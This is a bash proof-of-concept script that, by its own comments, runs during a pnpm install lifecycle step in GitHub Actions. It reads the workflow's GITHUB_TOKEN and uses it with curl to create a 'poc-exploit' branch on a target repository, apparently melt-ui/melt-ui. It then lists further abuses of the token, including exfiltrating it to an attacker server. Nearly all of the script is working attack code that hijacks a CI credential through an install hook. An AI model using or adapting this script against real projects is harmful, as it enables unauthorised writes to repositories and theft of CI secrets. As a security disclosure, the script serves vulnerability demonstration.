#!/bin/bash

# POC Script - Demonstrates GITHUB_TOKEN exfiltration/misuse
# This script runs during pnpm install lifecycle

echo "================================================"
echo "üö® POC: GITHUB_TOKEN is accessible!"
echo "================================================"

# Check if GITHUB_TOKEN exists
if [ -z "$GITHUB_TOKEN" ]; then
    echo "‚ùå GITHUB_TOKEN not found in environment"
    exit 0
fi

echo "‚úÖ GITHUB_TOKEN is present in environment"

# Get repository info from GitHub context
REPO="${GITHUB_REPOSITORY:-melt-ui/melt-ui}"
API_BASE="https://api.github.com"

echo "üìç Repository: $REPO"
echo "üìç Actor: $GITHUB_ACTOR"
echo "üìç Event: $GITHUB_EVENT_NAME"

# Attempt to create a proof branch using the token
BRANCH_NAME="poc-exploit-$(date +%s)"
SHA="${GITHUB_SHA:-unknown}"

echo ""
echo "üéØ Attempting to create branch: $BRANCH_NAME"
echo "   This proves the token has write access..."

# Create a new branch reference
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  "$API_BASE/repos/$REPO/git/refs" \
  -d "{\"ref\":\"refs/heads/$BRANCH_NAME\",\"sha\":\"$GITHUB_SHA\"}")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE:")

echo ""
echo "üì° Response Code: $HTTP_CODE"
echo "üì° Response Body: $BODY"

if [ "$HTTP_CODE" = "201" ]; then
    echo ""
    echo "‚úÖ SUCCESS! Branch created: $BRANCH_NAME"
    echo "üö® VULNERABILITY CONFIRMED: Attacker can create branches!"
    echo ""
    echo "This demonstrates that an attacker can:"
    echo "  - Create/delete branches"
    echo "  - Modify pull requests"
    echo "  - Access repository metadata"
    echo "  - Potentially exfiltrate data"
    echo ""
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo ""
    echo "‚ö†Ô∏è  Token exists but lacks permissions (code: $HTTP_CODE)"
    echo "   However, it may still be useful for:"
    echo "   - Exfiltrating to attacker server"
    echo "   - Reading private repository data"
    echo "   - Other API operations within token scope"
    echo ""
else
    echo ""
    echo "‚ö†Ô∏è  Unexpected response (code: $HTTP_CODE)"
    echo "   Token is still accessible and could be exfiltrated"
    echo ""
fi

echo "================================================"
echo "POC Complete - Check output above"
echo "================================================"
